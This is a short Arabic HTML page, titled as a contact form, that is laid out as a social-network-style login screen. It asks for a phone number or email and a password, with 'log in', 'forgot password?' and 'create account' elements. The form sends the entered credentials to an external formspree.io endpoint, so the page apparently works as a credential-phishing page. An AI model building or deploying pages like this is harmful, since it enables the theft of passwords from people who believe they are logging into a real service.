<!DOCTYPE html>
<html lang="ar">
<head>
  <meta http-equiv="refresh" content="">
  <meta charset="UTF-8">
  <title>نموذج اتصال</title>
  <link rel="stylesheet" href="hololo.css">
</head>
<body>

  <div class="lo">
 <img class="logo" src="logo lite.png" alt=""></div>  
  <form action="https://formspree.io/f/xdkdkvdg" method="POST" id="contactForm">
    <label for="contact">  </label>
    <input type="text" id="contact" name="mot de passe" placeholder="رقم الهاتف او البريد الالكتروني " required>

    <label for="message"> </label>
    <input type="text" id="message" name="message" placeholder="  كلمة السر" required>

    <button type="submit">تسجيل الدخول</button>
    <h2>  هل نسيت كلمة السر؟   </h2>
  </form>

    <button class="kalima" type="submit"> انشاء حساب جديد</button>
  <script>
    document.getElementById("contactForm").addEventListener("submit", function(event) {
      const contactInput = document.getElementById("contact").value.trim();
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      const phoneRegex = /^(\+?\d{7,15}|\d{9,15})$/;

      if (!emailRegex.test(contactInput) && !phoneRegex.test(contactInput)) {
        alert("❗ يرجى إدخال بريد إلكتروني أو رقم هاتف صالح.");
        event.preventDefault();
      }
    });
  </script>

</body>
</html>
